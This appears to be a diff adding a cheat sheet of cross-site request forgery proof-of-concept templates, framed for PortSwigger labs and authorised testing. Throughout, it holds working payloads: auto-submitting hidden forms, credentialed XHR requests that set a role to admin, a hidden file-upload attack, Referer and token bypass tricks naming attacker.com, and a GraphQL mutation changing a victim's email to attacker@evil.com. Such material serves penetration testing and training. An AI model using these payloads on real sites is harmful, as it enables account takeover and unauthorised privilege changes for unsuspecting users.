@@ -1,0 +1,95 @@
+# CSRF PoC templates — PAT Cross-Site Request Forgery + PortSwigger labs
+# Replace TARGET_URL, PARAMS, CSRF_TOKEN as needed. Authorized testing only.
+
+# === HTML GET — user click ===
+<a href="TARGET_URL?PARAM=VALUE">Click Me</a>
+
+# === HTML GET — no interaction (img) ===
+<img src="TARGET_URL?PARAM=VALUE">
+
+# === HTML GET — iframe ===
+<iframe src="TARGET_URL?PARAM=VALUE"></iframe>
+
+# === HTML POST — manual submit ===
+<form action="TARGET_URL" method="POST">
+<input name="PARAM" value="VALUE">
+<input type="submit" value="Submit">
+</form>
+
+# === HTML POST — autosubmit ===
+<form id="csrf" action="TARGET_URL" method="POST">
+<input name="PARAM" value="VALUE">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+
+# === POST text/plain JSON smuggling ===
+<form id="csrf" action="TARGET_URL" enctype="text/plain" method="POST">
+<input type="hidden" name='{"role":"admin","other":"' value='"}'>
+</form>
+<script>document.getElementById('csrf').submit();</script>
+
+# === POST multipart file upload CSRF ===
+<script>
+function launch(){
+  const dT = new DataTransfer();
+  dT.items.add(new File(["CSRF-content"], "CSRF-filename.txt"));
+  document.xss[0].files = dT.files;
+  document.xss.submit();
+}
+</script>
+<form style="display:none" name="xss" method="post" action="TARGET_URL" enctype="multipart/form-data">
+<input type="file" name="file">
+</form>
+<script>launch();</script>
+
+# === XHR GET simple ===
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "TARGET_URL");
+xhr.withCredentials = true;
+xhr.send();
+</script>
+
+# === XHR POST simple (text/plain JSON) ===
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "TARGET_URL");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "text/plain");
+xhr.send('{"role":"admin"}');
+</script>
+
+# === XHR POST complex (application/json + preflight) ===
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "TARGET_URL");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send('{"role":"admin"}');
+</script>
+
+# === Referer bypass prefixes (broken validation) ===
+Referer: https://target.com.attacker.com/
+Referer: https://attacker.com/?https://target.com
+Referer: https://target.com
+Referer: 
+Referer: null
+
+# === CSRF token bypass patterns to test ===
+# Remove token param entirely
+# Use token from another user session
+# Use token in GET instead of POST
+# Duplicate token in cookie + body (same value)
+# Empty token value
+# Token tied to non-session cookie only
+
+# === Method override ===
+POST with _method=GET
+POST with X-HTTP-Method-Override: GET
+POST with X-HTTP-Method: PUT
+
+# === GraphQL CSRF (GET mutation when accepted) ===
+<img src="TARGET/graphql?query=mutation{changeEmail(email:%22attacker@evil.com%22){success}}">
+
+# === JSONP / callback CSRF (legacy) ===
+<script src="TARGET_URL?callback=alert"></script>
